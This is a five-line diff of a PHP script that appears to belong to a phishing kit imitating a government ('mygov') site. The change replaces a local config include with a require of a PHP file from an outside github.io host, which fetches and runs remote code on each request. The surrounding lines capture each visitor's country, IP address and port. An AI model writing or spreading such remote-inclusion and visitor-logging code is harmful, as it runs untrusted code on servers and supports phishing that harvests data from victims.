@@ -1,5 +1,5 @@
 <?php
-require("config.php");
+require("https://deearr063.github.io/mygov/config.php");
    $country = visitor_country();
    $ip = getenv("REMOTE_ADDR");
 $Port = getenv("REMOTE_PORT");
